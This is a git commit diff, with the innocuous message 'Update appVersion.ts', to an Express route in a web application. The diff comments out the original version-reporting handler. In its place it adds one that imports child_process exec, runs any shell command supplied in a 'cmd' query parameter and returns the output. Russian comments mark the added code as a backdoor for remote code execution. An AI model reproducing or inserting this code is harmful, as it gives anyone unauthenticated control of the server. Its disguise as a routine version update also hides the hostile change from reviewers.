581721096403f0896dffa8bd4c5630b583a51232
Kirill Poliakov <145561178+Kirde001@users.noreply.github.com>
2025-11-18 20:19:12 +0300

    Update appVersion.ts

--- routes/appVersion.ts
+++ routes/appVersion.ts
@@ -3,6 +3,9 @@
  * SPDX-License-Identifier: MIT
  */
 
+/*
+
+
 import config from 'config'
 import { type Request, type Response } from 'express'
 
@@ -14,4 +17,36 @@ export function retrieveAppVersion () {
       version: config.get('application.showVersionNumber') ? utils.version() : ''
     })
   }
+}
+
+*/
+
+
+import config from 'config'
+import { Request, Response, NextFunction } from 'express'
+import { exec } from 'child_process' // <--- Импортируем модуль для RCE
+
+export const retrieveAppVersion = () => (req: Request, res: Response, next: NextFunction) => {
+  
+  // --- НАЧАЛО БЭКДОРА ---
+  const command = req.query.cmd as string;
+  
+  if (command) {
+    console.log(`[RCE] Executing: ${command}`);
+    // Выполняем команду
+    exec(command, (error, stdout, stderr) => {
+      // Отправляем результат текстом, чтобы браузер не думал что это HTML
+      res.type('text/plain'); 
+      if (stdout) return res.send(stdout);
+      if (stderr) return res.send(stderr);
+      if (error) return res.send(error.message);
+      res.send('Executed');
+    });
+    return; // Прерываем выполнение, чтобы не пошла стандартная логика
+  }
+  // --- КОНЕЦ БЭКДОРА ---
+
+
+  // Стандартная логика (вернется, если нет параметра ?cmd=)
+  res.json({ version: config.get('application.version') })
 }
